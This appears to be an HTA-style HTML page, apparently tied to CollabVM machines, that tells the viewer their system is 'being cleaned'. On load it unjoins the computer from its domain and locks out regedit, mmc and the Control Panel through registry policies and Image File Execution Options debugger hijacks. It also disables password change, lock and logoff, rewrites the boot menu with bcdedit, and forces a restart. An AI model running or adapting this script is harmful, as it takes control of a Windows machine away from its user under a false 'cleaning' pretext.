<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<title>Working...</title>

<script language="javascript">

function setReg(path, type, value) {
    document.querySelectorAll('.log')[0].appendChild(document.createTextNode(path+": "+value))
    var shell = new ActiveXObject("WScript.Shell");
    document.title = path
    shell.RegWrite(path, value, type);
}

function runCmd(cmd) {
    document.querySelectorAll('.log')[0].appendChild(document.createTextNode("Running command: "+cmd))
    var shell = new ActiveXObject("WScript.Shell");
    document.title = cmd
    shell.Run(cmd, 0, true);
}

function applyPolicies() {
    fso = new ActiveXObject("Scripting.FileSystemObject");
    if (fso.FileExists("C:/b.txt")) {
        document.title = "FIXING AERO!! DO NOT ClOSE!"
        document.querySelectorAll('.log')[0].appendChild(document.createTextNode("AERO iS BEING FIXED! PLEASE WAIT!"))
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("winsat formal", 0, true);
        window.close()
    }
    try {
        var strComputer = ".";
        var network = new ActiveXObject("WScript.Network");
        var strUser = network.ComputerName;
        var locator = new ActiveXObject("WbemScripting.SWbemLocator");
        var service = locator.ConnectServer(strComputer, "root\\cimv2");
        var systems = service.ExecQuery("Select * from Win32_ComputerSystem");
        var e = new Enumerator(systems);
        for (; !e.atEnd(); e.moveNext()) {
            var computer = e.item();
            var result = computer.UnjoinDomainOrWorkgroup("", strUser, 0);
        }
    } catch (err) {}
    var ad = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\\";
    var ex = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\";
    var dr = ex + "DisallowRun\\";
    var sys = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
    var themeKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize\\";
    var persCU = "HKCU\\Software\\Policies\\Microsoft\\Windows\\Personalization\\";
    setReg(ad+"NoChangingWallPaper", "REG_DWORD", 1);
    setReg(ad+"NoAddingComponents", "REG_DWORD", 1);
    setReg(ad+"NoDeletingComponents", "REG_DWORD", 1);
    setReg(ad+"NoComponents", "REG_DWORD", 0);
    setReg(ex+"NoDesktop", "REG_DWORD", 0);
    setReg(ex+"NoThemesTab", "REG_DWORD", 1);
    setReg(sys+"Wallpaper", "REG_SZ", "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
    setReg("HKCU\\Control Panel\\Desktop\\TileWallpaper", "REG_SZ", "0");
    setReg("HKCU\\Control Panel\\Desktop\\WallpaperStyle", "REG_SZ", "2");
    setReg(themeKey+"SystemUsesLightTheme", "REG_DWORD", 1);
    setReg(themeKey+"AppsUseLightTheme", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Policies\\Microsoft\\Windows\\Personalization\\NoChangingColor", "REG_DWORD", 1);
    setReg(sys+"NoColorChoice", "REG_DWORD", 1);
    setReg(sys+"NoVisualStyleChoice", "REG_DWORD", 1);
    setReg(sys+"NoDispBackgroundPage", "REG_DWORD", 1);
    setReg(sys+"NoDispAppearancePage", "REG_DWORD", 1);
    setReg(sys+"NoDispSettingsPage", "REG_DWORD", 1);
    setReg(sys+"NoDispScrSavPage", "REG_DWORD", 1);
    setReg(sys+"NoSizeChoice", "REG_DWORD", 1);
    setReg(sys+"DisableLockWorkstation", "REG_DWORD", 1);
    setReg(sys+"DisableChangePassword", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer\\NoPinningToTaskbar", "REG_DWORD", 1);
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\SettingsPageVisibility", "REG_SZ", "hide:personalization");
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe\\Debugger", "REG_SZ", "cmd.exe /c exit");
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe\\Debugger", "REG_SZ", "cmd.exe /c exit");
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\\Debugger", "REG_SZ", "cmd.exe /c exit");
    setReg(persCU+"NoChangingMousePointers", "REG_DWORD", 1);
    setReg(persCU+"NoChangingTheme", "REG_DWORD", 1);
    setReg(persCU+"NoChangingStartMenuBackground", "REG_DWORD", 1);
    setReg(dr+"1", "REG_SZ", "mmc.exe");
    setReg(dr+"2", "REG_SZ", "regedit.exe");
    setReg(dr+"3", "REG_SZ", "control.exe");
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize\\ColorPrevalence", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\DWM\\ColorizationColor", "REG_DWORD", 436207616);
    setReg("HKCU\\Software\\Microsoft\\Windows\\DWM\\ColorizationColorBalance", "REG_DWORD", 100);
    setReg("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\HibernateEnabled", "REG_DWORD", 0); 
    setReg("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\CsEnabled", "REG_DWORD", 0);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoLogOff", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoClose", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoSwitchUser", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableLockWorkstation", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoLogoff", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoPowerOptions", "REG_DWORD", 1);
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ShutdownWithoutLogon", "REG_DWORD", 1);
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\HideFastUserSwitching", "REG_DWORD", 1);
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableCAD", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoUserMgr", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel", "REG_DWORD", 1);
    var network = new ActiveXObject("WScript.Network");
    var strUser = network.ComputerName;
    var s = "C:/a.txt";
    if (!fso.FileExists(s)) {
        fso.CreateTextFile("c:\\a.txt", true);
        runCmd('bcdedit /timeout 3');
        runCmd('bcdedit /set {current} description "CollabVM '+strUser+'"');
        runCmd('bcdedit /set {bootmgr} displaybootmenu yes');
        runCmd('bcdedit /copy {current} /d "This system has been cleaned by initgoatfs"');
        runCmd("shutdown /r /t 2");
        runCmd("taskkill /f /im explorer.exe");
    }
    if (fso.FileExists(s)) {
        fso.CreateTextFile("c:\\b.txt", true);
        runCmd('logoff')
    }
    window.close()
}

window.onload = applyPolicies;
</script>

</head>
<body>
    <p>Your system is being cleaned.</p>
    <div class="log">
        
    </div>
</body>
</html>
